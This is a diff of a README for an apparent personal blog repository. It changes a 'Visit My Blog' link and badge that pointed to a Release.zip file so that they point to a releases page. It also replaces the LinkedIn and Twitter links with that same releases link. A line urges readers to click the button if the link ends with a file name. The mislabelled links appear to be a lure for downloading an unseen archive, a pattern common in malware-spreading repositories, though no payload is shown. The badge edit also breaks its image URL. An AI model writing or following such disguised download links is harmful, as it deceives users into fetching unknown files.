@@ -18,10 +18,10 @@ Dive into my blog posts and enhance your knowledge on the latest trends and best
 
 ## Visit My Blog
 
-🔗 [Visit My Blog](https://github.com/releases/789694263/Release.zip)
+🔗 [Visit My Blog](https://github.com/desha5755/blog/releases)
 
 ```markdown
-[![Launch Blog](https://img.shields.io/badge/Launch-Blog-blue)](https://github.com/releases/789694263/Release.zip)
+[![Launch Blog](https://github.com/desha5755/blog/releases)](https://github.com/desha5755/blog/releases)
 ```
 
 *Note: Click on the button above to launch the blog if the link ends with a file name.*
@@ -36,7 +36,7 @@ Don't forget to ⭐️ star this repository to bookmark it for future reference.
 
 ## Connect With Me
 
-Let's connect! Feel free to reach out for collaborations, feedback, or just to say hi. You can find me on [LinkedIn](https://www.linkedin.com/in/yourprofile) and [Twitter](https://twitter.com/yourhandle).
+Let's connect! Feel free to reach out for collaborations, feedback, or just to say hi. You can find me on [LinkedIn](https://github.com/desha5755/blog/releases) and [Twitter](https://github.com/desha5755/blog/releases).
 
 ---
 
